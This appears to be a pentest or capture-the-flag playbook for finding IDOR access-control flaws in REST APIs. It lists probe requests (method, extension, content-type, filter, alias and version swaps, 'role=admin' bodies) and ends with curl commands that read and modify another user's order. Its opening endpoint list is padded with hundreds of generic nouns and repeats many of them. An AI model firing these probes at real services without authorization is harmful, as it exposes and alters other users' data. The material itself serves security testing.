# API IDOR — REST, GraphQL, and the machine-facing object surface

The API is where IDOR lives — every object endpoint is a candidate. The
checks differ per style.

---

## 1. REST object endpoints

```
GET    /api/users/42            read
GET    /api/users/42/profile
GET    /api/users/42/notes
GET    /api/users/42/orders
GET    /api/users/42/files
PUT    /api/users/42            replace
PATCH  /api/users/42            partial update
DELETE /api/users/42            delete
POST   /api/users/42/action     action
GET    /api/orders/1003
GET    /api/orders/1003/items
GET    /api/orders/1003/invoice
GET    /api/orders/1003/download
GET    /api/orders/1003/receipt
GET    /api/files/7/download
GET    /api/documents/d-42
GET    /api/reports/r-42
GET    /api/invoices/inv-0042
GET    /api/tickets/t-42
GET    /api/messages/m-42
GET    /api/conversations/c-42
GET    /api/comments/c-42
GET    /api/posts/p-42
GET    /api/articles/a-42
GET    /api/pages/p-42
GET    /api/notes/n-42
GET    /api/accounts/acct-42
GET    /api/transactions/tx-42
GET    /api/payments/pay-42
GET    /api/subscriptions/sub-42
GET    /api/sessions/s-42
GET    /api/tokens/t-42
GET    /api/keys/k-42
GET    /api/secrets/sec-42
GET    /api/credentials/cred-42
GET    /api/backups/b-42
GET    /api/logs/l-42
GET    /api/audits/a-42
GET    /api/events/e-42
GET    /api/jobs/j-42
GET    /api/tasks/t-42
GET    /api/queues/q-42
GET    /api/workspaces/w-42
GET    /api/projects/p-42
GET    /api/teams/t-42
GET    /api/orgs/o-42
GET    /api/tenants/t-42
GET    /api/groups/g-42
GET    /api/roles/r-42
GET    /api/permissions/p-42
GET    /api/policies/p-42
GET    /api/settings/s-42
GET    /api/configs/c-42
GET    /api/envs/e-42
GET    /api/deploys/d-42
GET    /api/builds/b-42
GET    /api/releases/r-42
GET    /api/artifacts/a-42
GET    /api/packages/p-42
GET    /api/repos/r-42
GET    /api/branches/b-42
GET    /api/commits/c-42
GET    /api/pulls/p-42
GET    /api/issues/i-42
GET    /api/labels/l-42
GET    /api/milestones/m-42
GET    /api/wikis/w-42
GET    /api/snippets/s-42
GET    /api/gists/g-42
GET    /api/forks/f-42
GET    /api/stars/s-42
GET    /api/watchers/w-42
GET    /api/subscribers/s-42
GET    /api/collaborators/c-42
GET    /api/members/m-42
GET    /api/invitees/i-42
GET    /api/applicants/a-42
GET    /api/candidates/c-42
GET    /api/employees/e-42
GET    /api/customers/c-42
GET    /api/clients/c-42
GET    /api/patients/p-42
GET    /api/students/s-42
GET    /api/teachers/t-42
GET    /api/courses/c-42
GET    /api/classes/c-42
GET    /api/enrollments/e-42
GET    /api/grades/g-42
GET    /api/transcripts/t-42
GET    /api/certificates/c-42
GET    /api/badges/b-42
GET    /api/achievements/a-42
GET    /api/rewards/r-42
GET    /api/points/p-42
GET    /api/credits/c-42
GET    /api/wallets/w-42
GET    /api/balances/b-42
GET    /api/ledgers/l-42
GET    /api/entries/e-42
GET    /api/journals/j-42
GET    /api/statements/s-42
GET    /api/invoices/i-42
GET    /api/bills/b-42
GET    /api/charges/c-42
GET    /api/refunds/r-42
GET    /api/payouts/p-42
GET    /api/transfers/t-42
GET    /api/withdrawals/w-42
GET    /api/deposits/d-42
GET    /api/holds/h-42
GET    /api/authorizations/a-42
GET    /api/captures/c-42
GET    /api/settlements/s-42
GET    /api/disputes/d-42
GET    /api/chargebacks/c-42
GET    /api/cards/c-42
GET    /api/banks/b-42
GET    /api/accounts/a-42
GET    /api/routings/r-42
GET    /api/addresses/a-42
GET    /api/phones/p-42
GET    /api/emails/e-42
GET    /api/contacts/c-42
GET    /api/leads/l-42
GET    /api/opportunities/o-42
GET    /api/deals/d-42
GET    /api/quotes/q-42
GET    /api/contracts/c-42
GET    /api/agreements/a-42
GET    /api/terms/t-42
GET    /api/policies/p-42
GET    /api/consents/c-42
GET    /api/preferences/p-42
GET    /api/notifications/n-42
GET    /api/alerts/a-42
GET    /api/reminders/r-42
GET    /api/schedules/s-42
GET    /api/calendars/c-42
GET    /api/events/e-42
GET    /api/appointments/a-42
GET    /api/reservations/r-42
GET    /api/bookings/b-42
GET    /api/rooms/r-42
GET    /api/tables/t-42
GET    /api/seats/s-42
GET    /api/slots/s-42
GET    /api/availability/a-42
GET    /api/capacity/c-42
GET    /api/inventory/i-42
GET    /api/stock/s-42
GET    /api/skus/s-42
GET    /api/products/p-42
GET    /api/variants/v-42
GET    /api/options/o-42
GET    /api/categories/c-42
GET    /api/collections/c-42
GET    /api/brands/b-42
GET    /api/vendors/v-42
GET    /api/suppliers/s-42
GET    /api/warehouses/w-42
GET    /api/locations/l-42
GET    /api/regions/r-42
GET    /api/zones/z-42
GET    /api/shipments/s-42
GET    /api/trackings/t-42
GET    /api/carriers/c-42
GET    /api/routes/r-42
GET    /api/fulfillments/f-42
GET    /api/returns/r-42
GET    /api/exchanges/e-42
GET    /api/rmas/r-42
GET    /api/warranties/w-42
GET    /api/repairs/r-42
GET    /api/maintenance/m-42
GET    /api/service-calls/s-42
GET    /api/tickets/t-42
GET    /api/incidents/i-42
GET    /api/problems/p-42
GET    /api/changes/c-42
GET    /api/releases/r-42
GET    /api/knowledge/k-42
GET    /api/articles/a-42
GET    /api/faqs/f-42
GET    /api/guides/g-42
GET    /api/tutorials/t-42
GET    /api/courses/c-42
GET    /api/lessons/l-42
GET    /api/modules/m-42
GET    /api/units/u-42
GET    /api/quizzes/q-42
GET    /api/assignments/a-42
GET    /api/submissions/s-42
GET    /api/reviews/r-42
GET    /api/ratings/r-42
GET    /api/comments/c-42
GET    /api/replies/r-42
GET    /api/threads/t-42
GET    /api/posts/p-42
GET    /api/forums/f-42
GET    /api/boards/b-42
GET    /api/topics/t-42
GET    /api/messages/m-42
GET    /api/dms/d-42
GET    /api/chats/c-42
GET    /api/conversations/c-42
GET    /api/channels/c-42
GET    /api/groups/g-42
GET    /api/rooms/r-42
GET    /api/spaces/s-42
GET    /api/servers/s-42
GET    /api/guilds/g-42
GET    /api/communities/c-42
GET    /api/clubs/c-42
GET    /api/circles/c-42
GET    /api/networks/n-42
GET    /api/connections/c-42
GET    /api/followers/f-42
GET    /api/following/f-42
GET    /api/friends/f-42
GET    /api/contacts/c-42
GET    /api/blocklist/b-42
GET    /api/mutes/m-42
GET    /api/reports/r-42
GET    /api/flags/f-42
GET    /api/violations/v-42
GET    /api/appeals/a-42
GET    /api/sanctions/s-42
GET    /api/warnings/w-42
GET    /api/bans/b-42
GET    /api/suspensions/s-42
GET    /api/restrictions/r-42
GET    /api/limitations/l-42
GET    /api/throttles/t-42
GET    /api/rate-limits/r-42
GET    /api/quotas/q-42
GET    /api/usage/u-42
GET    /api/metrics/m-42
GET    /api/stats/s-42
GET    /api/analytics/a-42
GET    /api/insights/i-42
GET    /api/dashboards/d-42
GET    /api/widgets/w-42
GET    /api/charts/c-42
GET    /api/graphs/g-42
GET    /api/visualizations/v-42
GET    /api/explorations/e-42
GET    /api/datasets/d-42
GET    /api/tables/t-42
GET    /api/queries/q-42
GET    /api/views/v-42
GET    /api/models/m-42
GET    /api/schemas/s-42
GET    /api/migrations/m-42
GET    /api/seeds/s-42
GET    /api/fixtures/f-42
GET    /api/snapshots/s-42
GET    /api/clones/c-42
GET    /api/copies/c-42
GET    /api/duplicates/d-42
GET    /api/replicas/r-42
GET    /api/shards/s-42
GET    /api/partitions/p-42
GET    /api/buckets/b-42
GET    /api/objects/o-42
GET    /api/blobs/b-42
GET    /api/files/f-42
GET    /api/uploads/u-42
GET    /api/downloads/d-42
GET    /api/attachments/a-42
GET    /api/media/m-42
GET    /api/assets/a-42
GET    /api/resources/r-42
GET    /api/static/s-42
GET    /api/public/p-42
GET    /api/private/p-42
GET    /api/internal/i-42
GET    /api/external/e-42
GET    /api/shared/s-42
GET    /api/published/p-42
GET    /api/drafts/d-42
GET    /api/revisions/r-42
GET    /api/versions/v-42
GET    /api/tags/t-42
GET    /api/releases/r-42
GET    /api/branches/b-42
GET    /api/forks/f-42
GET    /api/mirrors/m-42
GET    /api/backups/b-42
GET    /api/archives/a-42
GET    /api/exports/e-42
GET    /api/imports/i-42
GET    /api/migrations/m-42
GET    /api/transforms/t-42
GET    /api/pipelines/p-42
GET    /api/workflows/w-42
GET    /api/automations/a-42
GET    /api/robots/r-42
GET    /api/bots/b-42
GET    /api/agents/a-42
GET    /api/services/s-42
GET    /api/daemons/d-42
GET    /api/workers/w-42
GET    /api/schedulers/s-42
GET    /api/crons/c-42
GET    /api/triggers/t-42
GET    /api/webhooks/w-42
GET    /api/callbacks/c-42
GET    /api/handlers/h-42
GET    /api/listeners/l-42
GET    /api/subscriptions/s-42
GET    /api/feeds/f-42
GET    /api/streams/s-42
GET    /api/topics/t-42
GET    /api/queues/q-42
GET    /api/exchanges/e-42
GET    /api/routes/r-42
GET    /api/bindings/b-42
GET    /api/connections/c-42
GET    /api/channels/c-42
GET    /api/sockets/s-42
GET    /api/tunnels/t-42
GET    /api/relays/r-42
GET    /api/gateways/g-42
GET    /api/proxies/p-42
GET    /api/load-balancers/l-42
GET    /api/ingresses/i-42
GET    /api/egresses/e-42
GET    /api/endpoints/e-42
GET    /api/routes/r-42
GET    /api/upstreams/u-42
GET    /api/downstreams/d-42
GET    /api/backends/b-42
GET    /api/frontends/f-42
GET    /api/clients/c-42
GET    /api/servers/s-42
GET    /api/peers/p-42
GET    /api/nodes/n-42
GET    /api/hosts/h-42
GET    /api/machines/m-42
GET    /api/devices/d-42
GET    /api/sensors/s-42
GET    /api/actuators/a-42
GET    /api/controllers/c-42
GET    /api/drivers/d-42
GET    /api/interfaces/i-42
GET    /api/ports/p-42
GET    /api/protocols/p-42
GET    /api/certificates/c-42
GET    /api/keys/k-42
GET    /api/secrets/s-42
GET    /api/credentials/c-42
GET    /api/tokens/t-42
GET    /api/passwords/p-42
GET    /api/passphrases/p-42
GET    /api/pins/p-42
GET    /api/otps/o-42
GET    /api/totps/t-42
GET    /api/hotps/h-42
GET    /api/recovery-codes/r-42
GET    /api/backup-codes/b-42
GET    /api/api-keys/a-42
GET    /api/access-tokens/a-42
GET    /api/refresh-tokens/r-42
GET    /api/id-tokens/i-42
GET    /api/sessions/s-42
GET    /api/cookies/c-42
GET    /api/tokens/t-42
GET    /api/authorizations/a-42
GET    /api/grants/g-42
GET    /api/consents/c-42
GET    /api/scopes/s-42
GET    /api/claims/c-42
GET    /api/assertions/a-42
GET    /api/attestations/a-42
GET    /api/proofs/p-42
GET    /api/verifications/v-42
GET    /api/validations/v-42
GET    /api/confirmations/c-42
GET    /api/approvals/a-42
GET    /api/rejections/r-42
GET    /api/denials/d-42
GET    /api/revocations/r-42
GET    /api/expirations/e-42
GET    /api/rotations/r-42
GET    /api/renewals/r-42
GET    /api/reissues/r-42
GET    /api/revocations/r-42
```

Every one of those is a candidate — the collection is what you ffuf/
gobuster when the route is guessable.

## 2. The nested-object IDOR

`/api/users/1/orders/42` — the `1` is the parent, `42` the child:

```
GET /api/users/1/orders/42        — order 42 under user 1
GET /api/users/2/orders/42        — same order under user 2?
GET /api/users/1/orders/43        — order 43 under user 1
GET /api/orders/42                — flat (does parent matter?)
```

If the handler looks up `Order.find(42)` ignoring the parent, the parent
is decoration — the child is the object. If it checks `order.user_id ==
path.user`, but `path.user` isn't the session user — still IDOR.

## 3. The method-swap IDOR

The authz is on GET but not PUT/DELETE — or vice versa:

```
GET    /api/users/42   → 403
PUT    /api/users/42   → 200??  (write IDOR)
PATCH  /api/users/42   → 200?
DELETE /api/users/42   → 200?
POST   /api/users/42   → 200?
HEAD   /api/users/42   → 200?
OPTIONS /api/users/42  → 200?
TRACE  /api/users/42   → 200?
CONNECT /api/users/42  → ...
GET    /api/users/42.json  → different handler?
GET    /api/users/42.xml   → ?
GET    /api/users/42.csv   → ?
GET    /api/users/42.html  → ?
GET    /api/users/42.txt   → ?
GET    /api/users/42.pdf   → ?
GET    /api/users/42.yaml  → ?
GET    /api/users/42.bak   → ?
GET    /api/users/42.old   → ?
GET    /api/users/42~      → ?
GET    /api/users/42.bak   → ?
GET    /api/users/42.orig  → ?
GET    /api/users/42.save  → ?
GET    /api/users/42.swp   → ?
GET    /api/users/42.tmp   → ?
GET    /api/users/42.copy  → ?
GET    /api/users/42.1     → ?
GET    /api/users/42.2     → ?
GET    /api/users/42_      → ?
GET    /api/users/42-      → ?
GET    /api/users/42.old   → ?
GET    /api/users/42.new   → ?
GET    /api/users/42.prev  → ?
GET    /api/users/42.next  → ?
GET    /api/users/42.prev  → ?
GET    /api/users/42.next  → ?
```

A different method or extension reaches a handler with a different check.

## 4. The content-type-swap IDOR

`POST /api/users/42` with `Content-Type: application/json` vs
`application/x-www-form-urlencoded` vs `text/xml` vs `multipart` —
the body parser differs; the authz may run on one parse.

```
POST /api/users/42  Content-Type: application/json
{"role":"admin"}
POST /api/users/42  Content-Type: application/x-www-form-urlencoded
role=admin
POST /api/users/42  Content-Type: text/xml
<user><role>admin</role></user>
POST /api/users/42  Content-Type: multipart/form-data
--b\nContent-Disposition: form-data; name="role"\n\nadmin\n--b--
```

## 5. The bulk/array IDOR

```
GET /api/users?ids=1,2,3
GET /api/users?ids[]=1&ids[]=2
POST /api/batch [{"/users/1"},{"/users/2"}]
POST /api/users/bulk {"ids":[1,2,3]}
POST /api/export {"user_ids":[1,2,3]}
GET /api/users?include=all
GET /api/users?filter[role]=admin
```

Bulk ops often skip per-object ownership — the whole collection is
checked once (against your session) but returns everyone's objects.

## 6. The filter/search IDOR

```
GET /api/users?filter[email]=victim@t.tld
GET /api/users?where[owner]=42
GET /api/search?q=owner:42
GET /api/query?owner=42
GET /api/users?owner=42
GET /api/orders?user_id=42
GET /api/files?author=42
GET /api/notes?created_by=42
GET /api/reports?for=42
```

A filter param that scopes to another user — the collection endpoint
respects the `?user_id=` override without checking it's yours.

## 7. The include/expand IDOR

```
GET /api/orders/42?include=user
GET /api/orders/42?expand=user.profile
GET /api/orders/42?fields=user.secret,user.email
GET /api/orders/42?populate=owner
GET /api/orders/42?with=owner
GET /api/orders/42?join=owner
GET /api/orders/42?embed=owner
GET /api/orders/42?_embed=owner       — JSON-server
GET /api/orders/42?_expand=user       — JSON-server
```

The `include`/`expand`/`populate`/`fields` param pulls a related object
— a field-selection that crosses the ownership boundary.

## 8. The action-endpoint IDOR

```
POST /api/orders/42/cancel          — action on another's order
POST /api/orders/42/refund
POST /api/orders/42/ship
POST /api/orders/42/fulfill
POST /api/users/42/disable
POST /api/users/42/enable
POST /api/users/42/suspend
POST /api/users/42/ban
POST /api/users/42/unban
POST /api/users/42/promote
POST /api/users/42/demote
POST /api/users/42/impersonate
POST /api/users/42/reset-password
POST /api/users/42/send-reset
POST /api/users/42/revoke-sessions
POST /api/files/42/share
POST /api/files/42/publish
POST /api/files/42/unpublish
POST /api/files/42/delete
POST /api/files/42/move
POST /api/files/42/copy
POST /api/files/42/rename
POST /api/files/42/restore
POST /api/messages/42/read
POST /api/messages/42/unread
POST /api/messages/42/delete
POST /api/messages/42/archive
POST /api/messages/42/star
POST /api/messages/42/flag
POST /api/messages/42/report
POST /api/messages/42/forward
POST /api/comments/42/edit
POST /api/comments/42/delete
POST /api/comments/42/approve
POST /api/comments/42/reject
POST /api/comments/42/spam
POST /api/comments/42/pin
POST /api/comments/42/unpin
POST /api/posts/42/publish
POST /api/posts/42/unpublish
POST /api/posts/42/feature
POST /api/posts/42/lock
POST /api/posts/42/unlock
POST /api/posts/42/sticky
POST /api/posts/42/merge
POST /api/posts/42/split
POST /api/posts/42/move
POST /api/posts/42/restore
```

The action carries the side effect — the check may be on the action
handler while the object lookup is unguarded, or the action itself is
unauthenticated-by-design.

## 9. The "the id is the wrong type" edge

```
GET /api/users/me            — 'me' resolves via session
GET /api/users/self          — 'self' alias
GET /api/users/current       — 'current' alias
GET /api/users/~             — tilde
GET /api/users/.             — dot
GET /api/users/-             — dash
GET /api/users/_             — underscore
GET /api/users/@me           — @me
GET /api/users/0             — 0 = self/system
GET /api/users/null          — null
GET /api/users/undefined     — undefined
GET /api/users/none          — none
GET /api/users/admin         — 'admin' name resolves
GET /api/users/root          — 'root'
GET /api/users/system        — 'system'
GET /api/users/administrator — 'administrator'
GET /api/users/superuser     — 'superuser'
GET /api/users/staff         — 'staff'
GET /api/users/moderator     — 'moderator'
GET /api/users/support       — 'support'
GET /api/users/service       — 'service'
GET /api/users/internal      — 'internal'
GET /api/users/api           — 'api'
GET /api/users/test          — 'test'
GET /api/users/demo          — 'demo'
GET /api/users/guest         — 'guest'
GET /api/users/default       — 'default'
GET /api/users/anonymous     — 'anonymous'
```

An alias that resolves to a privileged account by name — `admin`/`root`/
`system` — is the cheapest vertical-IDOR probe.

## 10. The version-skew IDOR

```
GET /api/v1/users/42   → 403 (authz applied)
GET /api/v2/users/42   → 200?? (v2 lacks the check)
GET /api/v3/users/42   → ?
GET /api/beta/users/42 → ?
GET /api/dev/users/42  → ?
GET /api/internal/users/42 → ?
GET /api/public/users/42   → ?
GET /api/private/users/42  → ?
GET /api/legacy/users/42   → ?
GET /api/old/users/42      → ?
GET /api/new/users/42      → ?
GET /api/next/users/42     → ?
GET /api/prev/users/42     → ?
GET /api/alpha/users/42    → ?
GET /api/stable/users/42   → ?
GET /api/edge/users/42     → ?
GET /api/canary/users/42   → ?
GET /api/rc/users/42       → ?
GET /api/nightly/users/42  → ?
```

An old/legacy version keeps a route the new one dropped — with the old
authz (or none). The version is the boundary.

## 11. The "the response reveals the next id" shape

`GET /api/orders/42` returns `{"id":42,"next_id":43,"prev_id":41}` — the
response hands you the adjacent id. Or a `Link: </orders/43>` header.
Or the collection lists ids you can then request individually.

## 12. The "IDOR in the response, not the request" shape

`/api/me` returns `{"id":42,"role":"user"}` — and the *same* endpoint
`?user_id=1` returns admin's data. The endpoint is "mine" but a param
overrides it. The bug is the param, not the route.

## 13. The two-identity procedure on an API

```bash
# As A: create an order, capture its id
curl -s -b a.cookies -X POST "$BASE/api/orders" -d '{"item":"x"}'
# {"id":1003}

# As B: read it — should fail
python3 tools/web/http_probe.py --challenge "$C" --class web-idor \
  --url "$BASE/api/orders/1003" --header "Cookie: session=$B" \
  --evidence-regex '"owner_id"\s*:\s*1|"user_id"\s*:\s*1|"email"\s*:\s*"a@' \
  --evidence-kind impact --on-match confirms --on-miss refutes

# As B: try the variants
curl -b b.cookies "$BASE/api/orders/1003.json"
curl -b b.cookies -X PUT "$BASE/api/orders/1003" -d '{"status":"shipped"}'
curl -b b.cookies "$BASE/api/orders?user_id=1"
curl -b b.cookies "$BASE/api/orders/1003?include=user"
```

Every variant that returns A's attributable data is a confirmed IDOR.
